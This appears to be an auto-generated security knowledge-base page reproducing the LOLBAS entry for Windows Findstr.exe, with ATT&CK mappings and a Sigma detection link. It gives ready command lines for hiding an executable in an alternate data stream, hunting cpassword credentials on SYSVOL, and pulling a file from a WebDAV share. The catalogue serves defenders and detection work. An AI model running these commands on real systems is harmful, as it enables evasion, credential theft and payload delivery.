---
title: "Findstr.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Findstr.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Findstr.exe"
functions:
  - "ADS"
  - "Credentials"
  - "Download"
attack_technique_ids:
  - "T1564.004"
  - "T1552.001"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Write to ADS, discover, or download files with Findstr.exe

## Paths

- `C:\Windows\System32\findstr.exe`
- `C:\Windows\SysWOW64\findstr.exe`

## Commands

### 1. ADS

Searches for the string W3AllLov3LolBas, since it does not exist (/V) the specified .exe file is written to an Alternate Data Stream (ADS) of the specified target file.

```cmd
findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
```

- Use Case: Add a file to an alternate data stream to hide from defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 2. ADS

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.

```cmd
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
```

- Use Case: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1564-hide_artifacts#^t1564004-ntfs-file-attributes|T1564.004: NTFS File Attributes]]

### 3. Credentials

Search for stored password in Group Policy files stored on SYSVOL.

```cmd
findstr /S /I cpassword \\sysvol\policies\*.xml
```

- Use Case: Find credentials stored in cpassword attrbute
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1552-unsecured_credentials#^t1552001-credentials-in-files|T1552.001: Credentials In Files]]

### 4. Download

Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.

```cmd
findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
```

- Use Case: Download/Copy file from webdav server
- Privileges: User
- Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_findstr.yml

## Resources

- {'Link': 'https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/'}
- {'Link': 'https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f'}

## Acknowledgements

- {'Person': 'Oddvar Moe', 'Handle': '@oddvarmoe'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml)
